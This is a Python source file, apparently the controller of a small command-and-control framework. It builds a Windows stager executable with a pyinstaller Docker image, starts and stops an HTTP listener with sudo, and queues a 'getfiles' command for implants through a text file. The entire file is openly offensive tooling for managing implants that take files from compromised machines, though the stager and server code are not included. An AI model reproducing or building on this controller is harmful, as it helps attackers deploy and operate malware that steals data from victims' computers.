import subprocess
import  os,signal
import shutil
import pdb
import argparse
from flask import Flask,request



def generate_stager():
    ## Convert to exe and save
    if os.path.exists('./tmp'):
        shutil.rmtree('./tmp')

    os.mkdir('./tmp')
    subprocess.call('cp stager.spec tmp',shell=True)
    subprocess.call('cp requirements.txt tmp',shell=True)
    subprocess.call('cp stager.py tmp',shell=True)
    subprocess.call('sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows', cwd=r"./tmp",shell=True)


def parser():
	parser = argparse.ArgumentParser(description='Python based C2')
	
	parser.add_argument('-g', '--generate', help = 'Generates exe', action='store_true')
	args = parser.parse_args()
	return args

def kill_listeners(flask_process):
    os.killpg(os.getpgid(flask_process.pid), signal.SIGTERM)

def main():
    args = parser()
    if args.generate:
        ## Import stager code and convert to exe
        generate_stager()

    while True:
        print("Enter command:")
        cmd = str(input())
        if cmd == 'http':
            ## Run a http listsener
            ## see the process id 'ps -ef |grep nohup'
            ## https://stackoverflow.com/questions/4789837/how-to-terminate-a-python-subprocess-launched-with-shell-true
            flask_process = subprocess.Popen('sudo nohup python3 server.py > log.txt 2>&1 &',stdout=subprocess.PIPE, 
                       shell=True, preexec_fn=os.setsid)
            
            # grep = subprocess.check_output('ps -ef | grep "nohup python3 server.py"',shell=True)
            # grep = grep = grep.decode("utf-8")
            # flask_pid = grep.split('\n')[0].split()[1]
        if cmd == 'jobs':
            if 'flask_process' in locals():
                print("HTTP listener running ")
            else:
                print("No listener running")
        if cmd == 'kill':
            if 'flask_process' in locals():
                kill_listeners(flask_process)
                print("killed http listener")
            else:
                print("No listener running")
        if cmd == 'generate':
            generate_stager()
            print("exe dumped to ./tmp")
        if cmd == 'getfiles':
            f = open('commands.txt','w+')
            print('getfiles',file=f)
            f.close()
        if cmd == 'exit':
            kill_listeners(flask_process)
            break

    

if __name__=="__main__":
    try:
        main()
    except KeyboardInterrupt:
        kill_listeners(flask_process)